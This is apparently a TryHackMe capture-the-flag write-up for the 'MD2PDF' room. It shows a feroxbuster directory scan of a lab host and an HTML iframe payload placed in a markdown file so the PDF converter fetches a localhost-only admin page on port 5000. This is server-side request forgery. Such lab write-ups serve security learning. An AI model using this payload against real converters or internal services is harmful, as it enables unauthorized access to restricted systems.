---
title: MD2PDF
description: 'Injecting an iframe in a markdown file to gain access to an HTTP server which only allows connections from localhost'
pubDate: 2024-05-17
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/c53da808dba7b45a03b79dacf587ebb6.png'
---

Feroxbuster finds this:

```bash
feroxbuster -u http://10.10.243.116
...[snip]...
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        4l       18w      166c http://10.10.243.116/admin
200      GET      102l      182w     2660c http://10.10.243.116/
405      GET        4l       23w      178c http://10.10.243.116/convert
[####################] - 16s    30009/30009   0s      found:3       errors:13776
[####################] - 16s    30000/30000   1924/s  http://10.10.243.116/
```

Note that there is a "copy" running on port `5000`.

We can inject an iframe to get access to the admin page.

Payload of the markdown file which will be converted to PDF:
```html
<iframe src=http://localhost:5000/admin height=500 width=500></iframe>
```
